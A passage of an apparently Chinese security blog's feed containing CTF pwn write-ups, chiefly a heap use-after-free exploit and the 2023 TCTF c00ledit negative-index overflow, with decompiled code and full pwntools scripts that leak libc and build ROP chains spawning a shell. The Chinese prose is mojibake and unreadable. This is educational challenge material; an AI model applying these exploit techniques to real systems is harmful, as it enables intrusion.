class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> s,n :<span class="built_in">print</span>(<span class="string">&quot;\033[31m[&quot;</span>+s+<span class="string">&quot; -&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(n))+<span class="string">&quot;]\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28282</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p, execute=duan)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">num=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>,tbs(num))</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&#x27;Choice: &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    sla(menu, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Please input size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;Please input content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sla(menu, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Please input idx: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sla(menu, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Please input idx: \n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uaf</span>(<span class="params">idx=<span class="built_in">int</span></span>):   <span class="comment">#just one</span></span><br><span class="line">    choice(<span class="number">666</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Please input idx: \n&#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line">pal=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,pal)</span><br><span class="line">add(<span class="number">0x80</span>,pal)  <span class="comment">#9éš”ç¦»å—</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">uaf(<span class="number">8</span>)   <span class="comment">#8</span></span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">libc_base=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">2018272</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line">stdout = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;stdout&#x27;</span>,stdout)</span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;environ&#x27;</span>,environ)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0x80</span>,pal)  <span class="comment">#0 è…¾ä¸€ä¸ªtcache bin</span></span><br><span class="line">delete(<span class="number">8</span>)         <span class="comment">#æ”¾å…¥tcache bin</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">b&#x27;s1nec-1o&#x27;</span>)   <span class="comment">#1</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">pal=p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(stdout)</span><br><span class="line">add(<span class="number">0x70</span>,pal)   <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;s1nec-1o&#x27;</span>)   <span class="comment">#3</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">pal2 = p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(environ) + p64(environ + <span class="number">8</span>) * <span class="number">2</span>  <span class="comment">#fbad1800æ°å¥½ä½¿checké€šè¿‡</span></span><br><span class="line">add(<span class="number">0x80</span>,pal2)   <span class="comment">#4</span></span><br><span class="line">stack_addr=u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x128</span>  <span class="comment">#addçš„ret-8</span></span><br><span class="line">leak(<span class="string">&quot;stack_addr&quot;</span>,stack_addr)</span><br><span class="line"><span class="built_in">print</span>(stack_addr)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">p3 = p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(stack_addr)</span><br><span class="line">add(<span class="number">0x70</span>, p3)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&#x27;dddd&#x27;</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">open_addr = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write_addr = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="comment">#pop_rdi_ret = libc_base + libc.search(asm(&#x27;pop rdi;ret;&#x27;)).__next__()</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line"><span class="comment">#pop_rsi_ret = libc_base + libc.search(asm(&#x27;pop rsi;ret;&#x27;)).__next__()</span></span><br><span class="line">pop_rsi_ret = libc_base +<span class="number">0x000000000002601f</span></span><br><span class="line"><span class="comment">#pop_rdx_ret = libc_base + libc.search(asm(&#x27;pop rdx;ret;&#x27;)).__next__()</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000142c92</span> + libc_base</span><br><span class="line"></span><br><span class="line">flag_addr = stack_addr</span><br><span class="line">ppp = stack_addr + <span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">p4 = <span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># open(&#x27;./flag&#x27;, 0)</span></span><br><span class="line">p4 += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line"><span class="comment"># read(3, ppp, 0x50)</span></span><br><span class="line">p4 += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(ppp) + p64(pop_rdx_ret) + p64(<span class="number">0x50</span>) + p64(read_addr)</span><br><span class="line"><span class="comment"># puts(ppp)</span></span><br><span class="line">puts_addr = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p4 += p64(pop_rdi_ret) + p64(ppp) + p64(puts_addr)</span><br><span class="line">add(<span class="number">0x80</span>,p4)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>ä¸è¿‡æœ‰ä¸ªæ¶å¿ƒçš„ç‚¹ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆå¦‚æœæˆ‘çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    sla(menu, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Please input size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;Please input content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sla(menu, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Please input idx: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sla(menu, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Please input idx: \n&#x27;</span>, <span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure><p>è¿™éƒ¨åˆ†å¦‚æœå°†stræ”¹ä¸ºstr().encodeä¼šå¯¼è‡´ä¹‹åçš„putsæ— æ³•æ­£å¸¸è¾“å‡ºï¼ŒæŒºå¥‡æ€ªçš„ã€‚ã€‚ã€‚ã€‚ã€‚</p><h1 id="2023tctf-c00ledit"><a href="#2023tctf-c00ledit" class="headerlink" title="2023tctf-c00ledit"></a>2023tctf-c00ledit</h1><p>æœ¬é¢˜ä¸»è¦æ˜¯è´Ÿæ•°æº¢å‡º</p><h3 id="é™æ€åˆ†æ-3"><a href="#é™æ€åˆ†æ-3" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">switch</span> ( similar_read() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        add((__int64)a1, (__int64)a2, v3, v4);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        a1 = <span class="string">&quot;Not implemented!&quot;</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Not implemented!&quot;</span>);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">char</span> **))edit)(a1, a2);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        result = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">        result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºåªæä¾›äº†ä¸¤ä¸ªåŠŸèƒ½ï¼Œä¸€ä¸ªaddå’Œä¸€ä¸ªeditï¼Œaddä¸»è¦mallocä¸€ä¸ª0x10ï¼Œå‰0x8å­˜å¤§å°ï¼Œå0x8å­˜ä¸‹ä¸€ä¸ªmalloc(0x1000)çš„åœ°å€ï¼Œè€Œä¸»è¦çš„æ¼æ´ç‚¹åœ¨edit</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v1; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="string">&quot;No chance!&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( num &gt; <span class="number">16</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v0);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v0 = <span class="string">&quot;Invalid index!&quot;</span>;</span><br><span class="line">  v1 = similar_read();</span><br><span class="line">  <span class="keyword">if</span> ( !heap_addr[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v0);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Offset: &quot;</span>);</span><br><span class="line">  v2 = similar_read();</span><br><span class="line">  <span class="keyword">if</span> ( v2 + <span class="number">7</span> &gt;= *(_QWORD *)heap_addr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="string">&quot;Invalid offset!&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(v0);</span><br><span class="line">  &#125;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  result = read(<span class="number">0</span>, (<span class="type">void</span> *)(*(_QWORD *)(heap_addr[v1] + <span class="number">8LL</span>) + v2), <span class="number">8uLL</span>);<span class="comment">// æœ‰ä¸€ä¸ªå¾€ä¸Šçš„æº¢å‡º</span></span><br><span class="line">  ++num;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°ä¸¤ä¸ªæ¶‰åŠæ•°ç»„çš„åœ°æ–¹å‡æœ‰è´Ÿæ•°æº¢å‡ºï¼Œç¬¬ä¸€ä¸ªheapçš„è´Ÿæ•°å¯ä»¥æ¶‰åˆ°</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258834.png" alt="image-20240618171820924"></p><p>stdoutï¼Œå› æ­¤å¯ä»¥è€ƒè™‘é€šè¿‡stdoutæ¥æ³„éœ²libcåŸºå€ï¼Œä¼šå‘ç°åœ¨<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258835.png" alt="image-20240618171953942"></p><p>åœ¨IO_FILEä¸­å¦‚æœä¸ä¿®æ”¹ä»–çš„ä¸‰ä¸ªwriteæŒ‡é’ˆæŒ‡å‘çš„éƒ½æ˜¯æœ¬ç»“æ„ä½“çš„é«˜ä½åœ°å€ï¼Œå› æ­¤å¯ä»¥è¦†å†™ä½ä½æ¥æ³„éœ²ç»“æ„ä½“çš„åœ°å€ï¼Œè€Œåç§»å›ºç„¶æ˜¯ä¸å˜çš„ï¼Œå°±å¯ä»¥æ³„éœ²libcåŸºå€äº†ï¼Œç„¶åå†æ³„éœ²environæ¥æ‰“stack rop</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span> , arch=<span class="string">&#x27;amd64&#x27;</span> , log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./chall&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> s,n :<span class="built_in">print</span>(<span class="string">&quot;\033[31m[&quot;</span>+s+<span class="string">&quot; -&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(n))+<span class="string">&quot;]\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28282</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p, execute=duan)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,offset,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">b&#x27;Offset: &#x27;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line">    sa(<span class="string">b&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">edit(-<span class="number">8</span>,-<span class="number">131</span>,p64(<span class="number">0Xfbad1800</span>))</span><br><span class="line">edit(-<span class="number">8</span>,-<span class="number">91</span>,<span class="string">b&#x27;\x30&#x27;</span>)</span><br><span class="line">libc.address=u64((ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">2210416</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc.address)</span><br><span class="line">edit(-<span class="number">8</span>,-<span class="number">91</span>,p64(libc.sym[<span class="string">&#x27;_environ&#x27;</span>]+<span class="number">8</span>))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recv(0x9f0+13)</span></span><br><span class="line">p.recv(<span class="number">0xa03</span>)</span><br><span class="line">stack=u64((ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line">main_ret=stack-<span class="number">0x120</span></span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">0</span>,-<span class="number">24</span>,p64(main_ret))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">24</span>,p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">16</span>,p64(libc.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>)).__next__()+<span class="number">1</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0</span>,p64(libc.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>)).__next__()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>æ³¨æ„æ ˆå¹³è¡¡ï¼Œå¬è¯´ä¹Ÿå¯ä»¥æ‰“ä¿®æ”¹got.pltæ¥shellcodeï¼Œä¸è¿‡æ„Ÿè§‰æ˜¯è¦å†å†™</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;åˆ·é¢˜è®°å½•3&quot;&gt;&lt;a href=&quot;#åˆ·é¢˜è®°å½•3&quot; class=&quot;headerlink&quot; title=&quot;åˆ·é¢˜è®°å½•3&quot;&gt;&lt;/a&gt;åˆ·é¢˜è®°å½•3&lt;/h1&gt;&lt;h1 id=&quot;GDOUCTF-2023-Random&quot;&gt;&lt;a href=&quot;#GDOUCTF-2023-Random&quot; c</summary>
      
    
    
    
    <category term="åšé¢˜è®°å½•" scheme="http://s1nec-1o.github.io/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>è·¯ç”±å™¨çš„æ–‡ä»¶ç³»ç»Ÿä¸æå–</title>
    <link href="http://s1nec-1o.github.io/2024/06/11/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%8F%90%E5%8F%96/"/>
    <id>http://s1nec-1o.github.io/2024/06/11/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%8F%90%E5%8F%96/</id>
    <published>2024-06-11T09:08:17.000Z</published>
    <updated>2024-12-22T08:30:49.888Z</updated>
    
    <content type="html"><![CDATA[<p>å¤§è‡´åˆ†ä¸ºä»¥ä¸‹3ç§</p><ol><li>å¯ä»¥ç›´æ¥é€šè¿‡linuxçš„binwalkæå–çš„</li><li>ç”±äºlinuxå¯¹æ–‡ä»¶ç±»å‹åˆ¤æ–­é”™è¯¯ï¼Œå¯¹å­˜å‚¨æ–‡ä»¶ç³»ç»Ÿå‹ç¼©åŒ…ä½¿ç”¨äº†é”™è¯¯çš„å·¥å…·</li><li>å›ºä»¶è¢«åŠ å¯†ï¼Œå¯¼è‡´éœ€è¦é€šè¿‡ä¸€äº›æ‰‹æ³•æ¥ç»•è¿‡æˆ–è€…è§£å¯†å›ºä»¶ï¼Œè¿›è¡Œæ–‡ä»¶ç³»ç»Ÿçš„æå–çš„</li></ol><p>ä»¥ä¸‹ä¼šé€šè¿‡ä¸€äº›å…¸å‹çš„ä¾‹å­è¿›è¡Œè®²è§£</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¤§è‡´åˆ†ä¸ºä»¥ä¸‹3ç§&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å¯ä»¥ç›´æ¥é€šè¿‡linuxçš„binwalkæå–çš„&lt;/li&gt;
&lt;li&gt;ç”±äºlinuxå¯¹æ–‡ä»¶ç±»å‹åˆ¤æ–­é”™è¯¯ï¼Œå¯¹å­˜å‚¨æ–‡ä»¶ç³»ç»Ÿå‹ç¼©åŒ…ä½¿ç”¨äº†é”™è¯¯çš„å·¥å…·&lt;/li&gt;
&lt;li&gt;å›ºä»¶è¢«åŠ å¯†ï¼Œå¯¼è‡´éœ€è¦é€šè¿‡ä¸€äº›æ‰‹æ³•æ¥ç»•è¿‡æˆ–è€…è§£å¯†å›ºä»¶ï¼Œè¿›è¡Œæ–‡ä»¶ç³»ç»Ÿçš„æå–çš„&lt;/</summary>
      
    
    
    
    <category term="IOTå®‰å…¨" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="IOTå®‰å…¨" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-34644å¤ç°</title>
    <link href="http://s1nec-1o.github.io/2024/05/30/CVE-2023-34644%E5%A4%8D%E7%8E%B0/"/>
    <id>http://s1nec-1o.github.io/2024/05/30/CVE-2023-34644%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-05-29T16:35:54.000Z</published>
    <updated>2024-05-29T16:38:08.123Z</updated>
    
